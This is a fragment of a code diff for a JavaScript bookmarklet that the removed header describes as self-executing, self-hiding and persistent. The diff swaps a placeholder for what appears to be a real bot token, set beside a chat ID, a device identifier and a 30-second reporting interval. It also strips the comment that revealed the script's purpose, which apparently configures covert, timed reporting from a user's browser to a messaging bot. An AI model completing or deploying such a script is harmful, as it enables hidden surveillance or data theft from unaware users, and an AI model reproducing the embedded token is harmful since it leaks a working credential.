@@ -1,11 +1,7 @@
-// ================================================
-// AUTO-FIRE BOOKMARK — OPERATOR GRADE
-// Self-executing, self-hiding, persistent
-// ================================================
 
 (function() {
     const CONFIG = {
-        BOT_TOKEN: 'YOUR_BOT_TOKEN_HERE',
+        BOT_TOKEN: '8770095089:AAFs6Z4raZGnwTqL1aJdDEjVWeu5fa7okZw',
         CHAT_ID: '962420340',
         DEVICE_ID: 'bm_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 6),
         INTERVAL: 30000, // 30 seconds
